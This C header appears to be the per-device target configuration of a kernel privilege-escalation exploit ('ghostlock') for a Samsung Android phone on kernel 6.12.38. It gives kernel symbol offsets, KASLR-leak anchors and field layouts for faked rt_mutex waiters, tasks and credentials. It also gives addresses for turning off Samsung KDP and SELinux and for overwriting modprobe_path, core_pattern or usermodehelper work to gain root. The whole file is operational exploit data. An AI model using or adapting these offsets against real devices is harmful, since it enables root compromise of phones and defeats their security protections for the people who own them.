/* CZG1 target — derived from target.h (BZA5) with kallsyms/BTF-verified
 * CZG1 (6.12.38-android16-5-abA175FXXS6CZG1-4k) offsets; all symbol values
 * match the device-proven CZF1 set 1:1 except wq/umh (CZF1 header was stale
 * there). Gadgets for the env-gated filp-root fallback are TODO (=0). */
#ifndef TARGET_H
#define TARGET_H

#define BUILD_VARIANT_LABEL "ghostlock_a17czg1"
#define BUILD_FINGERPRINT "samsung/a17czg1"

/* Kernel address space (VA_BITS=39) */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x40000000ULL
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL
/* physmap on this SoC spans ~48GB (DDR ranks at high phys addrs) */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffec0000000ULL /* A17/CZF1 39-bit: verified via live pipe slot page decode (was 0xfffffffe00000000 — wrong; that value only appeared in unrelated constants) */

/* Global symbol offsets (kallsyms) */
#define INIT_TASK_OFF          0x0252CF40ULL
#define INIT_CRED_OFF          0x02542D10ULL
#define INIT_UTS_NS_OFF        0x026B6680ULL
#define EMPTY_ZERO_PAGE_OFF    0x02758000ULL
#define ROOT_TASK_GROUP_OFF    0x02760D80ULL
#define SELINUX_ENFORCING_OFF  0x027B0540ULL
#define KPTR_RESTRICT_OFF      0x0252B678ULL
#define CAP_CAPABLE_ACTIVE_OFF 0x027A8010ULL
#define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
#define SELINUX_BLOB_SIZES_OFF 0x018B80E8ULL
#define SECURITY_HOOK_HEADS_OFF 0x01846480ULL
#define KMALLOC_CACHES_OFF     0x018AE4C0ULL
#define ANON_PIPE_BUF_OPS_OFF  0x0127F088ULL
/* UMH root: workqueue symbol offsets (0 = not available, set per-device) */
#define SYSTEM_UNBOUND_WQ_OFF              0x018AE250ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0x000F8FDCULL
#define CONFIGFS_READ_ITER_OFF      0x00518E9CULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005190D0ULL
#define COPY_SPLICE_READ_OFF   0x004945B8ULL
#define NOOP_LLSEEK_OFF        0x00441664ULL
#define ASHMEM_MISC_FOPS_OFF   0x0ULL
#define ASHMEM_FOPS_OFF        0x029203A0ULL
#define ASHMEM_IOCTL_OFF       0x00DE4C38ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00DE4B08ULL
#define ASHMEM_MMAP_OFF        0x00DE4B84ULL
#define ASHMEM_OPEN_OFF        0x00DE4BA8ULL
#define ASHMEM_RELEASE_OFF     0x00DE4CD8ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00DE4AE0ULL

/* KASLR leak */
#define SLIDE_NFULNL_LOGGER_OFF       0x025221A8ULL
#define SLIDE_LOGGERS_0_1_OFF         0x025220F8ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x028934F0ULL
#define SLIDE_SYSCTL_BOOTID_OFF       0x028934F0ULL

/* Per-cpu runqueue anchor (see target_czf1.h / A17-NOTES rq->curr section).
 * BZA5 kallsyms-a17.txt: __per_cpu_offset @ image+0x24EB810, runqueues @
 * image+0x24CF3C0, init_stack @ image+0x24E0000. RQ_CURR_OFF=0xd10 carried
 * from the CZF1 device BTF (same 6.12 GKI family) — self-validates via the
 * pid match, with the task-list walk as fallback. */
#define PER_CPU_OFFSETS_OFF  0x0251B810ULL
#define RUNQUEUES_OFF        0x024EF440ULL
#define INIT_STACK_OFF       0x02510000ULL
#define RQ_CURR_OFF          0x0D10ULL
#define PER_CPU_OFFSETS      (KIMAGE_TEXT_BASE + PER_CPU_OFFSETS_OFF)
#define RUNQUEUES            (KIMAGE_TEXT_BASE + RUNQUEUES_OFF)
#define INIT_STACK           (KIMAGE_TEXT_BASE + INIT_STACK_OFF)
#define TASK_STACK_OFF       0x38ULL

/* Derived macros */
#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
/* Samsung KDP: kdp_enable byte (0 = all KDP cred paths off, incl.
 * security_integrity_current). Followed by padding up to init_sec@+8, so an
 * 8-byte pointer write is safe. A17 vmlinux: kdp_enable @ image+0x18EB3B0. */
#define KDP_ENABLE_OFF         0x019033B0ULL
#define KDP_ENABLE             (KIMAGE_TEXT_BASE + KDP_ENABLE_OFF)
/* Fake-cred payload back-links (mode-2 write no longer touches init_cred;
 * the written cred lives in our spray page and points at these statics). */
#define INIT_SEC_OFF      0x019033B8ULL
#define INIT_USER_NS_OFF  0x025415C8ULL
#define INIT_UCOUNTS_OFF  0x02543200ULL
#define INIT_GROUPS_OFF   0x02542D08ULL
#define ROOT_USER_OFF     0x02541840ULL
#define INIT_SEC      (KIMAGE_TEXT_BASE + INIT_SEC_OFF)
#define INIT_USER_NS  (KIMAGE_TEXT_BASE + INIT_USER_NS_OFF)
#define INIT_UCOUNTS  (KIMAGE_TEXT_BASE + INIT_UCOUNTS_OFF)
#define INIT_GROUPS   (KIMAGE_TEXT_BASE + INIT_GROUPS_OFF)
#define ROOT_USER     (KIMAGE_TEXT_BASE + ROOT_USER_OFF)
#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define PSELECT_WAITER_WORD_SHIFT 0

/* Struct field offsets (BTF verified) */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x28
#define WAITER_TASK_OFF           0x50
#define WAITER_LOCK_OFF           0x58
#define WAITER_WAKE_STATE_OFF     0x60
#define WAITER_PRIO_OFF           0x18
#define WAITER_DEADLINE_OFF       0x20
#define WAITER_WW_CTX_OFF         0x68

#define FAKE_WAITER_TREE_PRIO_OFF         0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_TASK_OFF              0x50
#define FAKE_WAITER_LOCK_OFF              0x58
#define FAKE_WAITER_WAKE_STATE_OFF        0x60
#define FAKE_WAITER_WW_CTX_OFF            0x68

#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0x94
#define FAKE_TASK_NORMAL_PRIO_OFF    0x9c
#define FAKE_TASK_TASK_GROUP_OFF     0x420
#define FAKE_TASK_PI_LOCK_OFF        0x9ec
#define FAKE_TASK_PI_WAITERS_OFF     0xa00
#define FAKE_TASK_PI_TOP_TASK_OFF    0xa10
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0xa18

#define MM_OWNER_OFF             0x410
#define TASK_PID_OFF             0x708
#define TASK_TGID_OFF            0x70c
#define TASK_REAL_PARENT_OFF     0x718
#define TASK_ATOMIC_FLAGS_OFF    0x6c8
#define TASK_REAL_CRED_OFF       0x8f8
#define TASK_CRED_OFF            0x900
#define TASK_COMM_OFF            0x910
#define TASK_TASKS_OFF           0x638
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF         0x9c8
/* fdtable walk (BTF-verified BZA5): own task -> files -> fdt -> fd[] */
#define TASK_FILES_OFF           0x940
#define FILES_FDT_OFF            0x20
#define FDT_MAX_FDS_OFF          0x00
#define FDT_FD_OFF               0x08
/* channel slide anchors (BTF/nm-verified BZA5) */
#define TASK_ACTIVE_MM_OFF       0x690          /* task_struct.active_mm */
#define INIT_MM_OFF              0x025F1E00ULL  /* init_mm (idle's active_mm) */
#define SYSCTL_BOOTID_ENTRY_OFF  0x0264BB58ULL  /* boot_id ctl_table entry */
#define BOOTID_STR_IMG_OFF       0x017E5814ULL  /* "boot_id" string (slide anchor) */
#define PROC_DO_UUID_OFF         0x009D6558ULL  /* its .proc_handler (@+0x18) */

#define CRED_UID_OFF         8
#define CRED_SECUREBITS_OFF  40
#define CRED_CAPS_OFF        48
#define CRED_SECURITY_OFF    128
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

#define PIPE_BUFFER_SIZE         0x28
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PIPE_INODE_INFO_STRUCT_SIZE   0xb8
#define PIPE_INODE_INFO_SIZE          0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                 0x60
#define PIPE_TAIL_OFF                 0x64
#define PIPE_MAX_USAGE_OFF            0x68
#define PIPE_RING_SIZE_OFF            0x6c
#define PIPE_NR_ACCOUNTED_OFF         0x70
#define PIPE_READERS_OFF              0x74
#define PIPE_WRITERS_OFF              0x78
#define PIPE_FILES_OFF                0x7c
#define PIPE_TMP_PAGE_OFF             0x90
#define PIPE_BUFS_OFF                 0xa8
#define PIPE_USER_OFF                 0xb0

#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x10
#define FOPS_READ_OFF         0x18
#define FOPS_WRITE_OFF        0x20
#define FOPS_READ_ITER_OFF    0x28
#define FOPS_WRITE_ITER_OFF   0x30
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

#define LOCK_OFF      0x0E80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0F80
#define SCRATCH_OFF   0x1200
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100

/* Write 2 specific */
#define CRED_COPY_OFF 0x1080

/* --- Constants recovered from the shipped A17 binary (lost main.c used
 * these as compile-time literals on the BZA5 target) --- */
/* boot_id sysctl "data" pointer (proc_do_uuid retarget target). NOTE: this is
 * NOT the same address as SLIDE_RANDOM_BOOT_ID_DATA (the random_table boot_id
 * buffer at 0x028204F0); the pointer that proc_do_uuid dereferences lives at
 * image+0x0261B920 on BZA5. */
#define SYSCTL_BOOTID_DATA_PTR_OFF 0x0264BB60ULL
#define SYSCTL_BOOTID_DATA_PTR (KIMAGE_TEXT_BASE + SYSCTL_BOOTID_DATA_PTR_OFF)
/* core_pattern / modprobe_path sysctl text buffers (BZA5) */
#define CORE_PATTERN_OFF  0x02600A88ULL
#define MODPROBE_PATH_OFF 0x025C4AA8ULL
#define CORE_PATTERN  (KIMAGE_TEXT_BASE + CORE_PATTERN_OFF)
#define MODPROBE_PATH (KIMAGE_TEXT_BASE + MODPROBE_PATH_OFF)
/* system_unbound_wq image address (table entry carries 0 on A17 — the wq-umh
 * stage uses this compile-time BZA5 value) */
#define SYSWQ_BZA5 (KIMAGE_TEXT_BASE + 0x018AE250ULL)
/* call_usermodehelper_exec_work (BZA5) */
#define UMH_EXEC_WORK_BZA5 (KIMAGE_TEXT_BASE + 0x000F8FDCULL)
/* fake-work staging area inside the payload page (wq-umh) */
#define WQ_FAKE_WORK_OFF 0x1700
#define WQ_FAKE_UMH_OFF  0x1800
/* filp-root gadgets (BZA5 text; names lost — commit path lands mid-ashmem_ioctl) */
#define FILP_COMMIT_GADGET_OFF 0x0ULL  /* TODO CZG1: filp-root fallback gadget not located (env-gated path only) */
#define NOOP_GADGET_OFF        0x0ULL  /* TODO CZG1: not located */
/* perf file-vote IP window (BZA5 text range of the target ioctl handler) */
#define ASHMEM_IOCTL_WIN_LO_OFF 0x0ULL  /* TODO CZG1: perf window not located */
#define ASHMEM_IOCTL_WIN_HI_OFF 0x0ULL  /* TODO CZG1 */

#endif

/* SLIDE mode pselect shift (pselect vs select stack frame diff 16B = 2 words) */
#define SLIDE_PSELECT_WORD_SHIFT 2
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1
